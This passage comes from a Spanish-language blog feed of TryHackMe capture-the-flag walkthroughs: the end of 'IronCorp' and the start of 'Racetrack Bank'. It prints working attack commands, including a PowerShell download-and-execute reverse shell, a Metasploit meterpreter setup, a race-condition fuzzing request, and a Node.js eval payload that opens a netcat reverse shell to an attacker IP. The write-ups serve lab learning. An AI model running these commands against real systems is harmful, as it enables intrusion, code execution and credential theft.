/vendor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@upset:~/thm/ironcorp#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;hydra&#34;&gt;HYDRA&lt;/h3&gt;
&lt;p&gt;Utilizamos hydra para realizar un ataque de fuerza bruta en el subdominio &lt;code&gt;admin.ironcorp.me&lt;/code&gt;, logramos encontrar las credenciales.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_021752.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;lficommand-injection---admin-area&#34;&gt;LFI/Command Injection - Admin Area&lt;/h2&gt;
&lt;p&gt;En el subdominio en el que encontramos las credenciales al iniciar sesion nos muestra una pagina en la que contiene un input para realizar querys.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_151918.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al realizar alguna busqueda o query no nos devuelve ningun resultado, intentamos realizar un RFI mediante una shell php, asp, apsx, pero ninguna de estas funcionó, solamente nos trae el codigo fuente y lo muestra en la pagina más no lo ejecuta.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_152314.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos leer archivos de sistema como &lt;code&gt;index.php&lt;/code&gt; pero no logra obtener el archivo incluso utilizando &lt;code&gt;localhost:11025/index.php&lt;/code&gt;, pero para poder obtener el codigo de esta pagina podemos utilizar el propio dominio y/o subdominio que tiene la maquina en su archivo &lt;code&gt;c:\Windows\System32\Drivers\etc\hosts&lt;/code&gt; para que la propia maquina reconozca su subdominio y obtenga el codigo fuente.&lt;/p&gt;
&lt;p&gt;Al hacer esto encontramos un subdominio que si funcionó y nos trajo el codigo fuente del &lt;code&gt;index.php&lt;/code&gt;, donde nos muestra un mensaje.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_153331.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al dirigirnos a la direccion que nos muestra, al parecer no tenemos permisos para ver el archivo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_153645.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Le pasamos el dominio con la pagina para obtener su codigo fuente como la pagina de index.php anterior y logramos ver que el codigo se ejecuta y se muestra en la pagina, pero no nos muestra el codigo fuente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_153856.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Le pasamos un nombre como parametro y se muestra en la pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_154038.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos ejecutar codigos en la maquina con &lt;a href=&#34;https://owasp.org/www-community/attacks/Command_Injection&#34;&gt;&lt;strong&gt;Command Injection&lt;/strong&gt;&lt;/a&gt; utilizando &lt;code&gt;shell scape&lt;/code&gt;. Logramos obtener la ejecucion de &lt;code&gt;whoami&lt;/code&gt; y vemos que el usuario tiene permisos de super usuario (&lt;strong&gt;nt authority\system&lt;/strong&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_154628.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell---administrator&#34;&gt;SHELL - Administrator&lt;/h2&gt;
&lt;p&gt;Utilizamos una de las shells que tiene nishang &lt;a href=&#34;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1&#34;&gt;&lt;strong&gt;Invoke-PowerShellTcp.ps1&lt;/strong&gt;&lt;/a&gt;, en nuestro archivo Invoke-PowerShellTcp.ps1 agregamos la siguiente linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-PowerShellTcp&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Reverse&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-IPAddress&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Port&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1338&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El comando que vamos a ejecutar en la maquina es el siguiente, para ejecutar nuestra shell&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;new-object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;webclient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;downloadstring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://10.10.10.10/Invoke-PowerShellTcp.ps1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Por alguna razon no acepta los espacios y hay que codificar nuestro comando dos veces para que se ejecute&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_205323.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos y logramos obtener nuestra shell&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_205522.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y nuestra primera flag &lt;strong&gt;user.txt&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_205836.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Utilizamos metasploit para conseguir una shell meterpreter utilizando un payload en powershell.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;metasploit&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msfconsole -x &amp;quot;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 1337; set ExitOnSession false; exploit -j&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;shell&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;powershell -command &amp;quot;&amp;amp; { iwr 10.10.10.10/meterpreter-64.ps1 -OutFile C:\Users\Administrator\Desktop\meterpreter-64.ps1 }&amp;quot;
Import-Module .\meterpreter-64.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Logramos obtener una sesion en meterpreter y los hashes de los usuarios :)&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_220844.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Pero lastimosamente no podemos utilizar estas credenciales ya que no existe algun servicio en donde podamos utilizarlas, es por eso que utilizamos &lt;a href=&#34;https://www.offensive-security.com/metasploit-unleashed/fun-incognito/&#34;&gt;&lt;code&gt;incognito&lt;/code&gt;&lt;/a&gt; para poder obtener los tokens del usuario &lt;code&gt;Admin&lt;/code&gt;, utilizarlas y obtener nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt; y una shell con ese usuario.&lt;/p&gt;
&lt;p&gt;Listamos las tokens y las utilizamos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_221828.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_221853.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/ironcorp/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/ironcorp/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Racetrack Bank</title>
        <link>https://sckull.github.io/posts/racetrackbank/</link>
        <pubDate>Tue, 12 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 12 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/racetrackbank/</guid>
        <description>Racetrack Bank es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Racetrack Bank es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Racetrack Bank&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;It&amp;rsquo;s time for another heist.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;110&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Dificil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/deltatemporal&#34;&gt;deltatemporal&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;80&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; y el puerto ssh &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;22&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; abiertos.
&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue May 12 17:18:37 2020 as: nmap -sV -o nmap_scan_mini racetrackbank.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; racetrackbank.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.163.203&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.36s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.14.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue May 12 17:20:04 2020 -- 1 IP address (1 host up) scanned in 86.52 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;En el puerto 80 encontramos una pagina en la que vemos una pagina sencilla&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_162323.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/racetrackbank# gobuster dir -u http://racetrackbank.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/create.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/home.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Home.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Login.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/purchase.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos una cuenta en la pagina y al iniciar sesion nos encontramos con un mensaje en el que indica que nos han dado &lt;code&gt;1 Gold&lt;/code&gt; y en la parte superior derecha vemos la cantidad.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_174359.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien vemos la pagina de &lt;code&gt;Purchase&lt;/code&gt; y &lt;code&gt;Give Gold&lt;/code&gt;, en la primera podemos comprar una cuenta premium, en la segunda podemos regalar a un usuario &lt;code&gt;Golds&lt;/code&gt; segun la cantidad que querramos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_174539.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_174615.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al analizar el codigo fuente de estas paginas, encontramos que existe una tercera pagina &lt;code&gt;premiumfeatures.html&lt;/code&gt; en la cual no tenemos acceso.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_174728.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Analizamos las peticiones con Burpsuite y vemos que en el header de la respuesta &lt;code&gt;Express&lt;/code&gt; por lo que podemos deducir que la pagina esta corriendo en NodeJS.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_175108.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;transferencia-asincrona-gold---wfuzz&#34;&gt;Transferencia Asincrona GOLD - WFUZZ&lt;/h2&gt;
&lt;p&gt;Creamos una segunda cuenta, para poder regalar &lt;code&gt;Gold&lt;/code&gt; a esta desde la primera cuenta. Le damos &lt;code&gt;1 Gold&lt;/code&gt; a pika desde test, y al hacer esto, test se queda en 0 y pika tiene 2, entonces, dependiendo de cuantas &lt;code&gt;Gold&lt;/code&gt; tengamos, esa cantidad podemos regalar, hay que mencionar que se tarda en realizar la transaccion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_175340.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hasta este punto, no habia otra parte en donde podriamos realizar alguna explotacion, por lo que &lt;em&gt;podríamos&lt;/em&gt; crear 10 mil cuentas y utilizar esas cuentas para dar a una sola los &lt;code&gt;10,000 Gold&lt;/code&gt; para comprar una cuenta premium y ver lo que hay ahí pero no seria lo mejor.&lt;/p&gt;
&lt;p&gt;Regresamos y revisamos el nombre de la maquina para ver si tenemos una alguna pista como en la maquina &lt;a href=&#34;sckull.github.io/posts/mango/&#34;&gt;&lt;strong&gt;Mango - HackTheBox&lt;/strong&gt;&lt;/a&gt; que en su nombre nos indicaba la base de datos &lt;code&gt;Mongo&lt;/code&gt;, en el caso de esta maquina nos menciona &lt;code&gt;Racetrack&lt;/code&gt; que al investigar acerca de este nombre podría hacer referencia al paquete &lt;a href=&#34;https://www.npmjs.com/package/racetrack&#34;&gt;&lt;strong&gt;racetrack - npm&lt;/strong&gt;&lt;/a&gt; que se encarga de verificar las peticiones &lt;strong&gt;asincronas&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Haciendo referencia a la funcionalidad &lt;a href=&#34;https://developer.mozilla.org/es/docs/Glossary/As%C3%ADncrono&#34;&gt;&lt;code&gt;Asíncrona&lt;/code&gt;&lt;/a&gt; del paquete, utilizamos &lt;code&gt;wfuzz&lt;/code&gt; para realizar multiples peticiones en las que realizamos una &lt;code&gt;transferencia de Gold&lt;/code&gt; de una cuenta a otra. Utilizamos un diccionario en el cual tenemos mil lineas con el numero &lt;code&gt;1&lt;/code&gt; para poder utilizar en el parametro &lt;code&gt;FUZZ&lt;/code&gt; necesario en wfuzz. Pero primero capturamos la peticion de transferencia y eliminamos los elementos del header que no son necesarios, la sintaxis quedaría de la siguiente forma:&lt;/p&gt;
&lt;p&gt;Transaccion de &lt;code&gt;pika a test&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wfuzz -u http://racetrackbank.thm/api/givegold -H &amp;quot;Content-Type: application/x-www-form-urlencoded&amp;quot; -b &amp;quot;connect.sid=s%3A1WZ2nxR7AU8055fkeBW_cLlTaLFVV6Sk.zoPUEOLRtqGfnyd291VT%2BJuzMlkFKT6NAxVjuSExNsY&amp;quot; -d &amp;quot;user=test&amp;amp;amount=FUZZ&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Al ejecutar esto obtenemos multiples respuestas &lt;code&gt;302&lt;/code&gt;, en donde las primeras diez tienen menos caracteres (agregamos &lt;code&gt;--sh 54&lt;/code&gt; a wfuzz) que las siguientes.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_184712.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos la cuenta de &lt;code&gt;test&lt;/code&gt; y vemos que tenemos más &lt;code&gt;Gold&lt;/code&gt;, por lo que es muy probable que tenga la funcionalidad asincrona.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_185039.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora realizamos una transaccion de &lt;code&gt;test a pika&lt;/code&gt; y volvemos a hacer lo mismo con wfuzz (aumentamos 5 en 5 nuestro diccionario) asi hasta lograr los &lt;code&gt;Gold&lt;/code&gt; necesarios para una cuenta premium en la cuenta test. Por alguna razon al realizar esta &amp;ldquo;explotacion&amp;rdquo; en ambas cuentas aumentan los &lt;code&gt;Gold&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_191944.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;brian-user---rce-nodejs&#34;&gt;BRIAN USER - RCE NodeJS&lt;/h3&gt;
&lt;p&gt;Hacemos la compra de una cuenta Premium, y podemos acceder a la pagina &lt;code&gt;Premium Features&lt;/code&gt; donde encontramos un input que al ingresar una operacion matematica nos devuelve el resultado.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44&#34;&gt;&lt;strong&gt;NODEJS RCE&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_192105.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el payload &lt;code&gt;process.cwd()&lt;/code&gt; para verificar el PATH donde esta la pagina ejecutandose, nos devuelve la carpeta principal de uno de los usuarios, el payload funciona y podemos intentar obtener una shell utilizando &lt;code&gt;require()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_192647.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ponemos a la escucha nuestro netcat (&lt;code&gt;rlwrap nc -lvp 1338&lt;/code&gt;) y ejecutamos nuestro payload en la pagina &lt;code&gt;require(&amp;quot;child_process&amp;quot;).exec(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 1338 &amp;gt;/tmp/f&#39;)&lt;/code&gt; utilizando burpsuite, codificamos nuestro payload.&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_193746.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos el codigo fuente de la pagina &lt;code&gt;PremiumFeatures&lt;/code&gt; donde eval esta presente.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_195548.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien encontramos las credenciales de la base de datos&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_195734.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Dentro de la maquina encontramos un binario el cual tiene permisos root, pero al anlizarlo y ejecutarlo no se pudo hacer mayor cosa.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_204759.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
